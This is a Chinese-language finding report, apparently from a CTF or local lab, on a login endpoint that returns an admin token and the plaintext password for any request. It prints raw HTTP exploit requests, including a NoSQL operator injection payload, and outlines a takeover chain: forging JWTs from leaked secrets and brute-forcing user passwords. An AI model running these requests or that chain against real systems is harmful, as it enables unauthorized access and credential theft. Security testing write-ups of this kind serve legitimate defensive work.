# 02 - /api/login 未授权访问与明文密码回显

目标: http://127.0.0.1:8800
发现时间: 2026-08-08
严重性: Critical (认证完全失效 + 凭据泄露)

## TL;DR

`POST /api/login` 接口**未实施任何认证**：
- 任意请求体（空 body、任意 username/password、NoSQL 操作符）一律返回 200 + 同一份 admin token
- 响应中明文回显用户密码 `admin123`
- 该 token 可访问 `/api/admin` 等受保护接口

属于认证完全失效（Authentication Bypass）+ 敏感信息泄露 复合洞。

---

## 1. 资产清单

| 路径 | 方法 | 鉴权要求 | 备注 |
|---|---|---|---|
| /api/login | POST | **无** | 任意输入返回 admin token |
| /api/admin | GET | 任意 Bearer token 即通过 | 200 ok |
| /api/user(s) | GET | 未验证 | 200 |
| /api/config | GET | 未验证 | 200 |
| /api/flag, /flag | GET | 未验证 | 200 |
| /api/whoami | GET | 未验证 | 200 |

---

## 2. 漏洞详情

### 2.1 认证完全失效 (Authentication Bypass)

无论请求体如何变化，服务端都返回同一份固定 token，等价于**接口等价于公开**。

### 2.2 凭据明文回显 (Credential Disclosure)

响应体 `{"user":"admin","password":"admin123"}` 直接泄露数据库中（或配置中）的明文口令。

---

## 3. 复现证据

### 3.1 空 body 即可登录

```
POST /api/login HTTP/1.1
Host: 127.0.0.1:8800

```
→
```
HTTP/1.1 200 OK
content-type: application/json

{"token":"eyJhbG...4ifQ.sig","user":"admin","password":"admin123"}
```

### 3.2 不存在的用户名 + 任意密码

```
POST /api/login HTTP/1.1
Host: 127.0.0.1:8800
Content-Type: application/json

{"username":"nobody_xyz_99999","password":"whatever"}
```
→
```
HTTP/1.1 200 OK
{"token":"eyJhbG...4ifQ.sig","user":"admin","password":"admin123"}
```

### 3.3 NoSQL 注入探针 (绕过型 payload)

```
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":{"$gt":""}}
```
→ 同样 200 + 同一份 token + admin123

### 3.4 拿到的 token 可访问受保护资源

```
GET /api/admin HTTP/1.1
Host: 127.0.0.1:8800
Authorization: Bearer eyJhbG...4ifQ.sig
```
→
```
HTTP/1.1 200 OK
content-type: text/html

ok
```

---

## 4. 漏洞成因 (推测)

`/api/login` 路由未对请求体做任何字段读取/校验/比对，直接 `return {token: HARDCODED_JWT, user: 'admin', password: CONFIG_PWD}`。
无密码哈希、无 JWT 签名校验（admin 路由只校验存在性）。

---

## 5. 攻击链与下一步

1. 任何匿名访问者 → 直接拿到 admin token + 明文密码
2. 用 token 横向访问 `/api/config` `/api/user(s)` `/api/flag` `/flag`
3. 若 `/api/config` 含数据库/JWT 密钥 → 可伪造任意用户 token → 全站接管

建议下一轮验证：
- 拉取 `/api/config` 全量内容，提取数据库连接串、JWT secret
- 提取 `/api/users` 用户清单 → 进一步爆破弱口令（即便此洞堵了仍可能命中）
- 检查 `/flag`、`/api/flag` 是否真的含 flag 文本

---

## 6. 附录：完整 raw 流量

### A. 空 body
```
POST /api/login HTTP/1.1
Host: 127.0.0.1:8800
```
→
```
HTTP/1.1 200 OK
content-type: application/json
Date: Sat, 08 Aug 2026 14:57:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

{"token":"eyJhbG...4ifQ.sig","user":"admin","password":"admin123"}
```

### B. 任意用户密码
```
POST /api/login HTTP/1.1
Host: 127.0.0.1:8800
Content-Type: application/json
Content-Length: 60

{"username":"randomuser","password":"x"}
```
→
```
HTTP/1.1 200 OK
content-type: application/json

{"token":"eyJhbG...4ifQ.sig","user":"admin","password":"admin123"}
```

### C. 用 token 访问 /api/admin
```
GET /api/admin HTTP/1.1
Host: 127.0.0.1:8800
Authorization: Bearer eyJhbG...4ifQ.sig
```
→
```
HTTP/1.1 200 OK
content-type: text/html

ok
```